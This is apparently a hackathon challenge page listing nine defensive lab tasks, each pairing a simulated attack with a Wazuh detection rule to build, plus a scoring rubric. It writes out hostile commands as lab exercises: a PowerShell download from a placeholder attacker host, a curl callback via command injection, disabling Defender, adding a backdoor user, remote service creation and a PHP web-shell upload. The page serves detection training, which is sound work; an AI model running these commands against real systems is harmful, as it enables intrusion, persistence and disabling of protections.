---
title: Challenges
parent: Cybersecurity
grand_parent: Hackathon Tracks
nav_order: 4
---

# Cybersecurity: Nine Defensive Lab Tasks

There are **five Windows and four Linux cards**. Existing guidance recommends selecting **two or three**; a formal completion minimum or compulsory platform mix is not explicitly established in the materials. Confirm the [selection conditions](rules.md#task-selection-and-confirmation) with the Technical Lead before committing. The `B` suffixes are task identifiers, not difficulty tiers or score multipliers. Allow roughly 30-40 minutes for an initial detection, then time for validation, investigation and evidence.

Work **only inside the designated isolated lab and on supplied or explicitly authorized targets**. No unauthorized interaction with university infrastructure, unrelated public systems or other teams' systems is permitted. Build a Wazuh rule, verify its alert and investigate the evidence. Use only the approved exercise procedures below; the broader bank guide does not add mandatory attacks, blocking or network tools.

Your selected task set is assessed once out of **100 points**, not per task. Approximately two to three judges may assess each team independently; their scores are averaged for ranking. The top three teams qualify for the Grand Finale. **No slides or formal pitch are required, and technical demonstrations have no presentation marks.**

## Participant workflow

1. Read the selected card and confirm its target, required behavior and authorized test/cleanup procedure.
2. Obtain access to the assigned endpoint, Wazuh dashboard and permitted rule/configuration route.
3. Identify the source listed in that card and confirm that the relevant events reach the manager.
4. Inspect the raw event, decoded fields and any existing matching rule; do not assume a copied rule ID fits another OS.
5. Configure only the selected source/channel/FIM paths or approved audit feed, within your permissions.
6. Develop the detection, validate its syntax/decoded fields with the approved Wazuh tools and explain the matching logic.
7. Generate the card's approved event on the designated lab system, or use a mentor-approved sample if that arrangement is explicitly accepted. A sample-only test must not be presented as live collection.
8. Locate the resulting alert and verify the required fields, endpoint and timestamp.
9. Investigate what happened; compare positive, benign and changed-input tests to identify missed detections or false positives.
10. Export the permitted evidence, document limitations/reproduction steps and restore lab changes as instructed.

The source/configuration and verification notes under each card apply these steps to that exercise. Match behavior rather than one test IP, username or filename; fixed monitored paths explicitly required by a FIM card are legitimate scope, not prohibited hardcoding.

---

## Windows

### W1B — Too many failed logins (easiest)

**Attack:** Brute-force RDP or SMB against the Windows target: 10–12 failed
logins against one account. Don't log in successfully — failures only.

**Build a rule that fires when:** 5+ failed logons (Event 4625) from the same
source IP within 2 minutes. Alert includes source IP and username.

**Source and prerequisites:** Windows Security log, failed-logon auditing and
collection of Event 4625 with source address and account fields. Use an approved
Windows authentication parent/decoded event, not an assumed SSH rule ID.

**Configure and verify:** Correlate failures by source IP using the stated count
and time window. Repeat the approved failure-only test, check count/window
boundaries and vary a lab account/source where authorized.

**Evidence:** Rule XML, source/channel settings, event/alert exports with source
IP and username, and positive/benign/changed-input results. Explain failed
authentication, not a successful breach.

### W2B — PowerShell ran something odd

**Attack:** On the Windows target, run a PowerShell download:
`powershell -c "Invoke-WebRequest -Uri http://<attacker>/payload.txt -OutFile C:\Users\Public\payload.txt"`

**Build a rule that fires when:** PowerShell is launched with a command line
containing a download verb (`Invoke-WebRequest`, `DownloadFile`,
`DownloadString`, `curl`). Alert includes the full command line and the
parent process.

**Watch out:** the final round uses a different download cmdlet or `curl.exe`
instead of `Invoke-WebRequest`. Match the *family*, not one literal string.

**Source and prerequisites:** Approved Windows process-creation telemetry,
such as configured Sysmon or Security 4688 collection, with command line and
parent-process context. Confirm those fields are actually available.

**Configure and verify:** Collect the required channel, inspect its decoded
process fields and test the existing approved download procedure using a
harmless lab file. Compare another permitted download form and benign
PowerShell use.

**Evidence:** Rule/configuration, full command line and parent context,
timestamped alert and test results. A download command is evidence of behavior,
not proof that its content was malicious.

### W3B — A new program was installed

**Attack:** Install a new Windows service from the attacker position:
`sc \\target create LabSvc binPath= C:\Users\Public\svc.exe`

**Build a rule that fires when:** a service is installed (Event 7045) with a
binary path **outside** `C:\Windows`. Your first negate condition. Alert
includes service name, path, account.

**Source and prerequisites:** Windows System log with Service Control Manager
Event 7045, plus permission to perform the approved service-install exercise
on the designated endpoint.

**Configure and verify:** Collect the System channel and inspect the actual
service-name/path/account fields. Detect the outside-Windows path condition,
then compare an approved changed service/path and a legitimate Windows-path
example. Follow the provided cleanup instructions.

**Evidence:** Rule, channel configuration, event/alert with the required fields
and positive/benign results. Explain why the location merits investigation;
installation outside the Windows directory is not automatically malware.

### W4B — Someone turned off the antivirus

**Attack:** Disable Windows Defender real-time monitoring:
`Set-MpPreference -DisableRealtimeMonitoring $true` — then re-enable it.

**Build a rule that fires when:** Defender real-time protection is disabled
(Event 5001). Optional extension: a second rule on the re-enable (Event 5000),
assessed within the same rubric rather than as bonus points.

You need to add the Defender operational channel to the agent's log
collection first — that's part of the challenge.

**Source and prerequisites:** Microsoft-Windows-Windows Defender/Operational,
an approved endpoint where these events are available, and explicit permission
for this temporary lab-only protection change.

**Configure and verify:** Collect the channel, observe the existing approved
disable/re-enable sequence and confirm Event 5001 is detected. Restore protection;
the Event 5000 re-enable detection is optional.

**Evidence:** Collection/rule settings, alert timestamp/event context, test
results and confirmation of restoration. Never perform this on a real managed
or personal endpoint outside the authorized lab.

### W5B — File integrity monitoring on Windows

**Attack:** On the Windows target, tamper with a protected file —
copy `rubbish.exe` into the Startup folder, or drop a modified DLL next
to a legitimate application in `C:\Program Files\` (or edit a Run key).

**Build a rule that fires when:** a new file appears in a monitored
location (Startup folder, or any file change under a protected directory)
with the right severity. Windows FIM is built into the Wazuh agent —
`<syscheck>` config — so your job is: configure the monitored directories,
restart the agent, write a rule on the resulting syscheck events.

**Watch out:** the registry is part of file integrity too. Complete detection
evidence for this task also includes monitoring `HKLM\...\Run` and alerting on new values.
Pre-existing entries (OneDrive etc.) must be distinguished from new changes.
Document the initial inventory and any first-scan alerts instead of assuming
enrolment alone establishes a quiet baseline.

**Source and prerequisites:** Wazuh agent FIM (`syscheck`) for the approved
Windows directory and relevant Run-key monitoring.

**Configure and verify:** Establish/document the baseline, configure the
monitored locations and use only approved harmless file/registry changes.
Check changed filenames/values and distinguish pre-existing entries from new
changes; account for initial-scan noise rather than assuming it cannot occur.

**Evidence:** FIM/rule configuration, file/registry change alerts with object
path and change type, baseline context and test results. Do not execute an
untrusted binary or alter a real production application.

---

## Linux

### L1B — SSH brute force detection (easiest)

**Attack:** Brute-force SSH on the Linux target: 10–12 failed logins against
one user. Failures only.

**Build a rule that fires when:** 5+ SSH failures from one source IP within
2 minutes. Alert includes source IP and username.

**Source and prerequisites:** The designated Linux SSH authentication log or
journal feed collected by the Wazuh agent. Confirm the decoded source/account
fields and actual matching SSH rule before choosing a correlation parent.

**Configure and verify:** Use the existing approved failure-only SSH exercise.
Verify the count/time boundary, changed lab source/account and benign
authentication; success-after-failure is not required by this card.

**Evidence:** Rule and collection settings, relevant log/alert exports and
test results. Explain failures without claiming a successful login.

### L2B — Someone edited the passwd file

**Attack:** Add a backdoor user: `useradd backdoor && passwd backdoor`

**Build a rule that fires when:** `/etc/passwd` or `/etc/shadow` changes.
Configure Wazuh FIM (syscheck) on those two files, then one rule.

**Source and prerequisites:** Wazuh FIM on the designated Linux endpoint,
monitoring both named files, with permission for the existing lab account-change
exercise.

**Configure and verify:** Establish a baseline, confirm change detection for
the configured files and repeat only the approved procedure. Legitimate account
administration also changes these files; a detected change is not by itself
proof of an unauthorized account.

**Evidence:** FIM/rule settings, path/change-type alerts, authorized test
timeline and benign comparison. Do not export file contents or password hashes;
disable content-diff reporting for sensitive account files.

### L3B — A web shell appeared

**Attack:** Upload a PHP file through the DVWA upload function, then request
it once in your browser.

**Build a rule that fires when:** a file lands in the web upload directory
(FIM), or when a `.php`/`.phtml` file under an upload path is requested over
HTTP. Either signal provides partial detection evidence for this task; both
together provide complete coverage of the upload-and-request sequence.

**Source and prerequisites:** The designated DVWA lab, Wazuh FIM for its
actual upload directory and collection of the relevant web-server access log.
Confirm paths and access permissions; do not use a public upload service.

**Configure and verify:** Use the existing approved upload/request exercise
with its harmless lab artifact. Correlate the new file and request by path/time,
then vary an approved filename and compare benign uploads/requests.

**Evidence:** Relevant FIM/access-log settings, detection rules and file/request
events with timestamps. Either signal supports partial evidence; showing the
sequence supports complete coverage without claiming an unobserved execution.

### L4B — The web server called home

**Attack:** From the web app's command-injection, make the server connect
out to your attacker machine (`curl http://<attacker>:8000/`).

**Build a rule that fires when:** an outbound connection comes from the
web-server process (`www-data`) to an authorized non-local lab destination.
The original card expects a preconfigured auditd feed; confirm it is present
with the Technical Lead, because no complete current-lab installer is published here.

**Source and prerequisites:** Approved Linux audit/process/network records
that link the outbound connection to the web-server identity/process, forwarded
to Wazuh. A web access log alone does not establish process ownership.

**Configure and verify:** Inspect the supplied audit fields and apply the Wazuh
rule above that feed. Use only the existing callback procedure and an authorized
lab listener, then compare an approved changed lab destination and unrelated
benign process activity. "Non-local" never authorizes internet targets.

**Evidence:** Rule and relevant collection configuration, process/identity and
destination context, timestamped alerts and tests. Explain the callback without
claiming data theft or command execution beyond the observed evidence.

---

## Recommended pairings

- **Fastest confidence:** W1B + L1B (same skill, two platforms)
- **Authentication + system changes:** W1B + W4B, or L1B + L2B (complementary detections, not mandatory blocking/hardening)
- **Integrity focus:** W5B + L2B (Windows and Linux file monitoring)
- **Web attack story:** L3B + L4B (the drop, then the callback)

Two or three done properly beats nine rushed. Identify your selected task IDs
in the submission and explain your choices.

## Technical assessment checkpoints

These are the observable outcomes for the selected cards. For **each selected task**, provide the rule/configuration, alert/log evidence, positive/changed-input/benign tests and investigation notes required by the [100-point rubric](rules.md#judging-criteria). Screenshots and optional containment experiments are supplementary, not new mandatory tasks.

| Task | Required detection evidence | Robustness checkpoint |
|---|---|---|
| W1B | Thresholded failed-logon alert containing source IP and username. | The stated time/count boundary is respected and another lab source or username still matches. |
| W2B | Download-behavior alert with full command line and parent process. | A different supported download command is detected without depending on one literal command or lab address. |
| W3B | Service-install event outside the Windows directory, with name, binary path and account. | A changed lab service/path is detected while legitimate Windows-path examples are distinguished. |
| W4B | Defender protection-disabled event from the required operational channel. | Verify event collection and alerting again after protection is restored; re-enable detection remains optional. |
| W5B | Protected-location file changes and new monitored Run-key values, with suitable event context/severity. | Changed filenames/values still alert, while pre-existing baseline entries do not generate false positives. |
| L1B | Thresholded SSH-failure alert with source IP and username. | Check the count/time boundary, a changed lab input and benign authentication activity. |
| L2B | FIM alerts for changes to the required account files. | Confirm both configured files are covered and preserve before/after evidence without exposing real credentials. |
| L3B | Evidence of both an uploaded web file and its HTTP request for complete sequence coverage. | A changed lab filename still matches; benign upload/request behavior is evaluated. |
| L4B | Alert linking a non-local outbound connection to the web-server process using supplied audit telemetry. | A changed authorized lab destination is detected without treating unrelated processes as the same behavior. |

| Criterion | Points |
|---|---:|
| Detection accuracy and coverage | 30 |
| Detection rule quality, specificity and robustness | 20 |
| Validation, testing and evidence quality | 15 |
| Investigation quality and alert interpretation | 15 |
| Log-source collection and system configuration | 10 |
| Documentation and reproducibility | 10 |
| **Total for the selected task set** | **100** |

Complete and reproducible evidence can earn full credit for a requirement. Partial chains or inconsistent behavior earn partial credit; absent or unsupported work earns none for the affected requirement. Task count, presentation style and literal-value-only detections do not substitute for working defensive controls. See the [rules](rules.md#scoring-and-tie-breakers) for averaging, ranking, technical tie-breakers and qualification.
